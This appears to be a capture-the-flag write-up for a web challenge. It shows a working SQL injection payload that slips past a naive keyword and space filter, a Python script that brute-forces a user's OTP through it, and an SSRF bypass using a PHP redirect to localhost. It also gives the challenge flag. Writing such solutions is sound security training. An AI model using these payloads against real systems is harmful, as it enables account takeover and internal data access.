@@ -1,0 +1,190 @@
+<h1>We know this all too well</h1>
+
+<blockquote>
+  <p>And you were tossing me the car keys, f*** the patriarchy...\
+  \
+  JekGarb is a taxi company in an alternative universe that is 50 times the size of google, controlling the world's ride hailing services. I got hold of some their source, can you tell me what's wrong?\
+  \
+  http://chals.ctf.sg:40301\
+  \
+  author: Gladiator</p>
+</blockquote>
+
+<h3>OTP Verification</h3>
+
+<p>After we first register an account, we will quickly find that we won't be able to log in to our registered account yet - we need to verify our OTP first.</p>
+
+<p>Let's take a look at how the verification is performed.</p>
+
+<p><code>go
+func verifyHandler(w http.ResponseWriter, r *http.Request) {
+    config.SetupResponse(&amp;w, r)
+    var otp data.UserAccount
+    err := json.NewDecoder(r.Body).Decode(&amp;otp)
+    if err != nil {
+        http.Error(w, err.Error(), http.StatusBadRequest)
+        return
+    }
+    if logic.VerifyOTP(otp) == false {
+        http.Error(w, "Failed to verify OTP", http.StatusBadRequest)
+        return
+    }
+    fmt.Fprint(w, "Account Verified")
+}
+</code></p>
+
+<p><code>go
+func VerifyOTP(account data.UserAccount) bool {
+    user, _ := data.GetUser(account.Username)
+    if user == nil {
+        return false
+    }
+    if account.Otp != user.Otp || account.Username != user.Username || config.CheckPasswordHash(account.Password, user.Password) == false {
+        return false
+    } else {
+        data.SetVerified(account.Username)
+    }
+    return true
+}
+</code></p>
+
+<p>Hmm... no dice. Looks like the verification logic itself is sound, so we have to find our OTP through some other vulnerability. Since the rest of the functions require us to be authenticated, we are only left with the <code>/search</code> URL.</p>
+
+<h3>Bypassing SQL Injection Protection</h3>
+
+<p>Sure enough, the MySQL query builder function looks like it's vulnerable to SQL injection. If we are able to control the <code>username</code> being substituted, we can escape out of the string.</p>
+
+<p><code>go
+func MySqlQueryBuilderSearchUser(username string) string {
+    return fmt.Sprintf("SELECT * FROM user WHERE username = '%s'", username)
+}
+</code></p>
+
+<p>The only problem is that spaces, <code>AND</code>, and <code>OR</code> are replaced with empty strings in our query.</p>
+
+<p><code>go
+func MySqlRealEscapeString(query string) string {
+    s := strings.TrimSpace(query)
+    s = strings.ToLower(s)
+    s = strings.Replace(s, " ", "", -1)
+    s = strings.Replace(s, "and", "", -1)
+    s = strings.Replace(s, "or", "", -1)
+    return s
+}
+</code></p>
+
+<p><code>go
+func serachHandler(w http.ResponseWriter, r *http.Request) {
+    config.SetupResponse(&amp;w, r)
+    username := r.URL.Query().Get("q")
+    username = config.MySqlRealEscapeString(username)
+    if logic.SearchByUsername(username) == false {
+        http.Error(w, "User does not exists", http.StatusBadRequest)
+        return
+    }
+    fmt.Fprint(w, username)
+}
+</code></p>
+
+<p>To bypass this, we make use of the fact that in MySQL, comments (<code>/**/</code>) can serve as spaces, and the above replacement is non-recursive.</p>
+
+<p>Our payload would then be:</p>
+
+<p><code>
+/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,&lt;POSITION&gt;,1))='&lt;GUESS&gt;
+</code></p>
+
+<p>Which will be translated into the MySQL query:</p>
+
+<p><code>sql
+SELECT * FROM user WHERE username = 'socengexp' AND (SUBSTR(otp,&lt;POSITION&gt;,1))='&lt;GUESS&gt;'
+</code></p>
+
+<p>where <code>GUESS</code> can be varied to bruteforce the character at <code>POSITION</code> (and <code>socengexp</code> is my username :smile:)</p>
+
+<p>Here's the script to find our OTP, though a custom SQLMap tamper script would probably work too.</p>
+
+<p>```python
+import requests, string</p>
+
+<p>i = 1
+result = ''
+while True:
+    found = False
+    for char in string.ascii_letters + string.digits:
+        r = requests.get(f"http://chals.ctf.sg:40301/search?q=socengexp'/<strong>/AANDND/</strong>/(SUBSTR(otp,{i},1))='" + char)</p>
+
+<pre><code>    if r.status_code != 400:
+        print("Found " + char)
+        result += char
+        i += 1
+        found = True
+        break
+
+if not found:
+    print("Not found")
+    break
+</code></pre>
+
+<p>print(result)
+```</p>
+
+<p>With the OTP we found, we can verify and log in to the application.&#x20;</p>
+
+<h3>Bypassing SSRF Protection</h3>
+
+<p>This gives us access to <code>/cornelia</code>, which performs a GET request to a URL of our choice.</p>
+
+<p><code>go
+func CorneliaStreet(r *http.Request) http.Response {
+    cleanUrl := config.ProcessGet(r)
+    if cleanUrl == "" {
+        return http.Response{Status: "500 Internal Server Error", StatusCode: 500, Body: nil}
+    }
+    resp, err := http.Get(cleanUrl)
+    if err != nil {
+        return http.Response{Status: "500 Internal Server Error", StatusCode: 500, Body: nil}
+    }
+    return *resp
+}
+</code></p>
+
+<p>This looks like it might be vulnerable to SSRF, but the following validation prevents us from specifying <code>localhost</code> or <code>127.0.0.1</code> etc. directly.</p>
+
+<p><code>go
+func ProcessGet(r *http.Request) string {
+    var host string
+    inputurl := r.URL.Query().Get("url")
+    u, err := url.Parse(inputurl)
+    if err != nil {
+        return ""
+    }
+    if strings.Contains(u.Host, ":") {
+        host, _, _ = net.SplitHostPort(u.Host)
+    } else {
+        host = u.Host
+    }
+    if u.Scheme == "" {
+        return ""
+    }
+    ips, _ := net.LookupIP(host)
+    for _, ip := range ips {
+        if ipv4 := ip.To4(); ipv4 != nil {
+            if ipv4.String() == "127.0.0.1" {
+                return ""
+            }
+        }
+    }
+    return retrieveUrl(r)
+}
+</code></p>
+
+<p>That's fine, since the server follows redirects. By redirecting to <code>localhost:8081/flag</code>, we can access the flag.</p>
+
+<p><code>php
+&lt;?php
+    Header("Location: http://localhost:8081/flag");
+?&gt;
+</code></p>
+
+<p>The flag is <code>CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}</code></p>
